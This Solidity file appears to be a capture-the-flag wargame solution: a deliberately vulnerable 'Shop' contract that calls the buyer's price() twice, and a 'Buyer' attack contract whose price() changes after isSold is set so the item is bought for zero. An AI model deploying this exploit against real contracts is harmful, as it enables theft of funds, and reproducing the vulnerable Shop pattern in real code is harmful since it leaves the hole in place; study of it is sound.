// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Buyer {

    Shop public shop;

    constructor(address _shopAddr) {
        shop = Shop(_shopAddr);
    }

    function attack() public {
        shop.buy();
    }

    function price() external view returns (uint) {
        return shop.isSold() ? 0 : 100;
    }
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}